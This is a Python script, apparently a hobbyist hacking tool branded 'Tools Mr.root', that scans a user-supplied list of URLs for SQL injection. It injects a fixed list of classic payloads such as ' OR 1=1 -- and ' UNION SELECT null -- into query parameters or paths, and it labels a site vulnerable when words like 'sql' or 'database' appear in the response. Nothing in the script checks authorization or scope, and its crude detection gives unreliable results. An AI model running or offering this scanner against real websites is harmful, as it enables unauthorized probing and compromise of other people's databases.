import time
import os
import pyfiglet
from tqdm import tqdm
from termcolor import colored
from prettytable import PrettyTable
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Welcome message with progress bar
def show_welcome_message():
    for i in tqdm(range(100), desc="Loading"):
        time.sleep(0.05)

    os.system('clear' if os.name == 'posix' else 'cls')
    banner = pyfiglet.figlet_format("Welcome to Tools")
    print(colored(banner, "cyan"))

    time.sleep(5)
    os.system('clear' if os.name == 'posix' else 'cls')

# Display tool name
def show_tool_name():
    tool_name = pyfiglet.figlet_format("Tools Mr.root")
    print(colored(tool_name, "green"))

# Inject payload into URL
def inject_payload(url, param, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    if param in query_params:
        query_params[param] = payload
    modified_query = urlencode(query_params, doseq=True)
    modified_url = urlunparse(parsed_url._replace(query=modified_query))
    return modified_url

# Scan for SQL Injection vulnerabilities
def scan_sql_injection(url):
    sql_payloads = [
        "'", "\"", "1' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a", "' UNION SELECT null --",
        "' AND 1=2 UNION SELECT null --", "' OR '1'='1' --", "admin'--", "1 OR 1=1"
    ]

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    if not query_params:  # Check if there are no query parameters, assume path-based injection
        test_urls = [url + payload for payload in sql_payloads]
    else:
        test_urls = [
            inject_payload(url, param, payload) 
            for param in query_params 
            for payload in sql_payloads
        ]

    for test_url in test_urls:
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200 and (
                "sql" in response.text.lower() or 
                "syntax error" in response.text.lower() or
                "database" in response.text.lower()
            ):
                return True, test_url
        except Exception as e:
            continue

    return False, None

# Main program
def main():
    # Display welcome message and tool name
    show_welcome_message()
    show_tool_name()

    # Request the file name
    filename = input("Enter the filename containing the list of URLs (e.g., list.txt): ").strip()
    if not os.path.exists(filename):
        print(colored("File not found. Please check the filename and path.", "red"))
        return

    # Load URLs from file
    with open(filename, "r") as file:
        urls = [line.strip() for line in file if line.strip()]

    if not urls:
        print(colored("The file is empty or contains invalid URLs.", "red"))
        return

    # Initialize results table
    results_table = PrettyTable()
    results_table.field_names = ["URL", "Vulnerability", "Full Path"]
    results_table.align = "l"

    # Scan each URL
    for url in urls:
        print(f"\nScanning: {url}")
        found = False

        # SQL Injection
        sql_injection, sql_path = scan_sql_injection(url)
        if sql_injection:
            results_table.add_row([colored(url, "green"), "SQL Injection", sql_path])
            print(colored(f"[+] Found SQL Injection: {sql_path}", "green"))
            found = True

        if not found:
            print(colored(f"[-] No vulnerabilities found for {url}", "red"))

    # Display results
    print("\nScan Results:")
    print(results_table)

if __name__ == "__main__":
    main()
